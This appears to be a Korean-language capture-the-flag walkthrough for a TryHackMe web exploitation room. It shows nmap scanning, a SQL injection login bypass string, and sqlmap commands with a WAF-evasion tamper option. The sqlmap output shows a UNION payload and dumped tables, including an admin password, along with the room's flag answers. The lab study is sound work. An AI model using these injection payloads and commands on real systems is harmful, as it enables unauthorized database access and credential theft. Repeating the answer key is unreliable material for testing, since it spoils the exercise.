# Day 5 | Web Exploitation Someone stole Santa's gift list! 

## Workstation
- Virtual Box : VMware Fusion 12.1.2
- OS : kali-linux-2021.1

## Walkthrough
Visit the vulnerable application in Firefox, find Santa's secret login panel and bypass the login. Use some of the commands and tools covered throughout today's task to answer Questions #3 to #6.

Santa reads some documentation that he wrote when setting up the application, it reads:

Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using `--tamper=space2commen`

***

![attackbox]()

Without using directory brute forcing, what's Santa's secret login panel?

> /santapanel

힌트를 확인하면 알 수 있다.

<img src="" width="800px" height="200px" title="hint" alt="hint"></img><br/>

Visit Santa's secret login panel and bypass the login using SQLi

nmap 으로 포트를 조사한다.

```
$ sudo nmap -sC -sV 10.10.70.181                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:26 EDT
Nmap scan report for 10.10.70.181
Host is up (0.28s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 35:30:91:45:b9:d1:ed:5a:13:42:3e:20:95:6d:c7:b7 (RSA)
|   256 f5:69:6a:7b:c8:ac:89:b5:38:93:50:2f:05:24:22:70 (ECDSA)
|_  256 8f:4d:37:ba:40:12:05:fa:f0:e6:d6:82:fb:65:52:e8 (ED25519)
3000/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.12)
|_http-title: Really Insecure PHP Page
3306/tcp open  mysql   MySQL 8.0.22
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.22
|   Thread ID: 298
|   Capabilities flags: 65535
|   Some Capabilities: SupportsCompression, Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, FoundRows, LongColumnFlag, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsLoadDataLocal, LongPassword, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: >\x0D6r[5[\x0DpF'5]0)\x0B\x14\x10@*
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.22_Auto_Generated_Server_Certificate
| Not valid before: 2020-11-19T19:12:24
|_Not valid after:  2030-11-17T19:12:24
|_ssl-date: TLS randomness does not represent time
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Santa's forum
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.51 seconds
```

8000번 포트에 http 서버가 열려있다.

![ip]()

비밀 로그인 패널이 있는 주소로 이동한다.

![santapanel]()

username 부분에 `' or true --`를 입력 후 login을 시도하면 다음과 같이 SQL Injection에 성공했다.

![username]()

paul로 검색을 해보면 아무것도 나오지 않는다.

![paul]()

해당 사이트를 sqlmap을 사용하기 위해 burpsuite를 사용한다.

```
$ burpsuite
```

버프스위트를 사용하기 위해 프록시 설정을 해준다.

![proxy]()

프록시 설정 후 해당 페이지를 새로고침하면 버프스위트 proxy 부분에 인터셉트 된다.

![intercept]()

이 부분을 저장한다. 마우스 우클릭 하면 Save Item 버튼을 클릭하면 된다.

![save]()

해당 페이지를 저장했다면 터미널에서 sqlmap을 사용한다.

```
$ sudo sqlmap -r ~/THM/sqlmap --dump-all --tamper space2comment --dbms sqlite 
        ___
       __H__                                                                                                               
 ___ ___[.]_____ ___ ___  {1.5.8#stable}                                                                                   
|_ -| . [,]     | .'| . |                                                                                                  
|___|_  [(]_|_|_|__,|  _|                                                                                                  
      |_|V...       |_|   http://sqlmap.org                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:42:19 /2021-08-25/

[04:42:19] [INFO] parsing HTTP request from '/home/jasper/THM/sqlmap'
[04:42:19] [INFO] loading tamper module 'space2comment'
[04:42:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: search=jasper' UNION ALL SELECT CHAR(113,106,113,112,113)||CHAR(121,112,112,116,115,108,99,82,89,122,107,102,104,107,121,110,77,105,87,70,104,118,90,97,100,78,74,87,88,84,113,74,79,109,82,88,79,76,101,115)||CHAR(113,122,112,112,113),NULL-- QKAu
---
[04:42:20] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[04:42:20] [INFO] testing SQLite
[04:42:21] [INFO] confirming SQLite
[04:42:21] [INFO] actively fingerprinting SQLite
[04:42:21] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[04:42:21] [INFO] sqlmap will dump entries of all tables from all databases now
[04:42:21] [INFO] fetching tables for database: 'SQLite_masterdb'
[04:42:21] [INFO] fetching columns for table 'sequels' 
[04:42:21] [INFO] fetching entries for table 'sequels'
Database: <current>
Table: sequels
[22 entries]
+-------------+-----+----------------------------+
| kid         | age | title                      |
+-------------+-----+----------------------------+
| James       | 8   | shoes                      |
| John        | 4   | skateboard                 |
| Robert      | 17  | iphone                     |
| Michael     | 5   | playstation                |
| William     | 6   | xbox                       |
| David       | 6   | candy                      |
| Richard     | 9   | books                      |
| Joseph      | 7   | socks                      |
| Thomas      | 10  | 10 McDonalds meals         |
| Charles     | 3   | toy car                    |
| Christopher | 8   | air hockey table           |
| Daniel      | 12  | lego star wars             |
| Matthew     | 15  | bike                       |
| Anthony     | 3   | table tennis               |
| Donald      | 4   | fazer chocolate            |
| Mark        | 17  | wii                        |
| Paul        | 9   | github ownership           |
| James       | 8   | finnish-english dictionary |
| Steven      | 11  | laptop                     |
| Andrew      | 16  | rasberry pie               |
| Kenneth     | 19  | TryHackMe Sub              |
| Joshua      | 12  | chair                      |
+-------------+-----+----------------------------+

[04:42:21] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.70.181/dump/SQLite_masterdb/sequels.csv'                                                                                                 
[04:42:21] [INFO] fetching columns for table 'users' 
[04:42:21] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| EhCNSWzzFP6sc7gB | admin    |
+------------------+----------+

[04:42:21] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.70.181/dump/SQLite_masterdb/users.csv'                                                                                                     
[04:42:21] [INFO] fetching columns for table 'hidden_table' 
[04:42:21] [INFO] fetching entries for table 'hidden_table'
Database: <current>
Table: hidden_table
[1 entry]
+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| thmfox{All_I_Want_for_Christmas_Is_You} |
+-----------------------------------------+

[04:42:21] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.70.181/dump/SQLite_masterdb/hidden_table.csv'                                                                                       
[04:42:21] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.70.181'

[*] ending @ 04:42:21 /2021-08-25/
```

나온 결과로 다음 문제를 풀어나가면 된다.

How many entries are there in the gift database?

> 22

What did Paul ask for?

> github ownership

What is the flag?

> thmfox{All_I_Want_for_Christmas_Is_You}

What is admin's password?

> EhCNSWzzFP6sc7gB